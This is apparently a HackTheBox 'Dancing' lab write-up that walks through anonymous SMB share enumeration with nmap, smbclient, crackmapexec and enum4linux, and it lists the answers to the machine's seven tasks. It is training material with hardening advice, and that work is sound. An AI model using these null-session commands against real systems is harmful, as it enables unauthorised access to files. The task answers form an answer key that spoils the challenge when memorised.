# HackTheBox Machine: Dancing
**SMB Share Enumeration Challenge**

## Machine Overview
Introductory HTB machine teaching SMB (Server Message Block) protocol basics and share enumeration. Demonstrates unauthenticated access to Windows file shares and file retrieval techniques.

**Difficulty:** Very Easy | **Status:** Active | **Platform:** HackTheBox Machines | **OS:** Windows | **Type:** Tutorial/Starting Point

---

## Methodology

### Phase 1: Reconnaissance
- Network connectivity verification
- Port scanning to identify SMB service
- OS fingerprinting (Windows detection)

### Phase 2: SMB Enumeration
- Identify SMB service on port 445/tcp
- List available shares without authentication
- Determine share accessibility

### Phase 3: Share Access
- Connect to accessible shares with blank password
- Navigate SMB filesystem structure
- Identify available files

### Phase 4: File Retrieval
- Download files from SMB shares
- Extract proof flags
- Document findings

---

## Tasks & Answers

### ✅ Task 1: SMB Protocol Definition
**Q:** What does the 3-letter acronym SMB stand for?  
**A:** `Server Message Block`

**Explanation:** SMB is a network file sharing protocol that enables applications and users to read and write to files and request services from computer networks. It's the foundation of Windows file sharing.

---

### ✅ Task 2: SMB Default Port
**Q:** What port does SMB use to operate at?  
**A:** `445`

**Explanation:** SMB operates on TCP port 445 (modern SMB3). Legacy NetBIOS over TCP uses port 139, but SMB native uses port 445.

---

### ✅ Task 3: SMB Service Name
**Q:** What is the service name for port 445 that came up in our Nmap scan?  
**A:** `microsoft-ds`

**Explanation:** Nmap identifies SMB service on port 445 as "microsoft-ds" (Microsoft Directory Services), indicating Windows file sharing service.

**Nmap Output:**
```bash
445/tcp open  microsoft-ds
```

---

### ✅ Task 4: SMB Client List Flag
**Q:** What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?  
**A:** `-L`

**Explanation:** The `-L` flag with smbclient lists available shares on a target SMB server without requiring authentication.

**Command:**
```bash
smbclient -L <target-ip>
```

---

### ✅ Task 5: Number of Shares
**Q:** How many shares are there on Dancing?  
**A:** `4`

**Explanation:** The Dancing machine exposes 4 SMB shares through the smbclient enumeration, including default and custom shares.

---

### ✅ Task 6: Accessible Share Name
**Q:** What is the name of the share we are able to access in the end with a blank password?  
**A:** `WorkShares`

**Explanation:** The WorkShares share permits anonymous (blank password) access, allowing unauthenticated users to list and download files from this share.

---

### ✅ Task 7: SMB File Download Command
**Q:** What is the command we can use within the SMB shell to download the files we find?  
**A:** `get`

**Explanation:** The `get` command within smbclient shell downloads individual files from the remote SMB share to the local machine.

**SMB Commands:**
```bash
smbclient> get filename        # Download single file
smbclient> mget *.txt         # Download multiple files
smbclient> ls                 # List directory
smbclient> put filename       # Upload file (if permitted)
smbclient> quit               # Exit SMB shell
```

---

## SMB Exploitation Walkthrough

```bash
# Step 1: Verify connectivity
ping <target-ip>

# Step 2: Scan for open ports
nmap <target-ip>

# Step 3: Identify SMB service
nmap -sV <target-ip>

# Step 4: List available shares
smbclient -L <target-ip>

# Step 5: Connect to accessible share (WorkShares)
smbclient \\\\<target-ip>\\WorkShares

# Step 6: When prompted for password, press Enter (blank password)

# Step 7: List files
ls

# Step 8: Download flag file
get flag.txt

# Step 9: Exit SMB shell
quit

# Step 10: Display captured flag
cat flag.txt
```

---

## Key Findings

| Category | Detail |
|----------|--------|
| **Vulnerability** | Unauthenticated SMB share access |
| **Service** | Microsoft Windows SMB (port 445/tcp) |
| **OS** | Windows |
| **Attack Vector** | Anonymous SMB share enumeration and file retrieval |
| **Impact** | Information disclosure, potential credential theft |
| **Root Cause** | Permissive share permissions without authentication |
| **Lesson** | Implement share access controls; disable anonymous access; use encryption |

---

## SMB Enumeration Commands

```bash
# List shares without credentials
smbclient -L <target-ip> -N

# List shares with null session
smbclient -L <target-ip> -U ""

# Connect to specific share
smbclient \\\\<target-ip>\\ShareName

# Enum with crackmapexec (alternative tool)
crackmapexec smb <target-ip> --shares -u '' -p ''

# Enum with enum4linux
enum4linux <target-ip>
```

---

## Tools Used
- **ping** - ICMP connectivity verification
- **nmap** - Port scanning and service identification
- **smbclient** - SMB client for share enumeration and access
- **Windows SMB** - Native Windows file sharing protocol

---

## Security Implications

This machine demonstrates critical Windows SMB vulnerabilities:
- **Anonymous Access:** SMB shares accessible without credentials
- **No Access Controls:** Sensitive files in publicly readable shares
- **Information Disclosure:** Configuration files and credentials exposed
- **Lateral Movement:** Weak SMB security enables network compromise

**Hardening Recommendations:**
- Disable anonymous SMB access
- Implement strong share permissions (ACLs)
- Disable SMB1 (use SMB3+ with encryption)
- Require authentication for all shares
- Use network segmentation
- Monitor SMB traffic for anomalies

---

## Windows vs Linux Differences

| Aspect | Windows (Dancing) | Linux (Meow/Fawn) |
|--------|-------------------|-------------------|
| **Protocol** | SMB/CIFS | Telnet/FTP |
| **Port** | 445 | 23/21 |
| **Auth** | Domain-based or local | Simple credentials |
| **Shares** | Named shares (WorkShares) | File system (direct access) |
| **Tools** | smbclient, enum4linux | telnet, ftp client |
| **Security** | Share permissions (ACLs) | User permissions |

---

## Learning Objectives Achieved
✅ Understand SMB protocol fundamentals
✅ Identify SMB services on Windows systems
✅ Enumerate available shares without authentication
✅ Connect to shares with blank passwords
✅ Download files from SMB shares
✅ Recognize SMB security weaknesses
✅ Understand Windows file sharing risks

---

## Score
**100% Complete** ✓
All 7 tasks answered and machine exploited successfully.

---

**Completion Date:** December 26, 2025  
**Machine Difficulty:** Very Easy ⭐  
**OS:** Windows  
**Time to Complete:** < 30 minutes  
**Status:** Active (Current Lab)
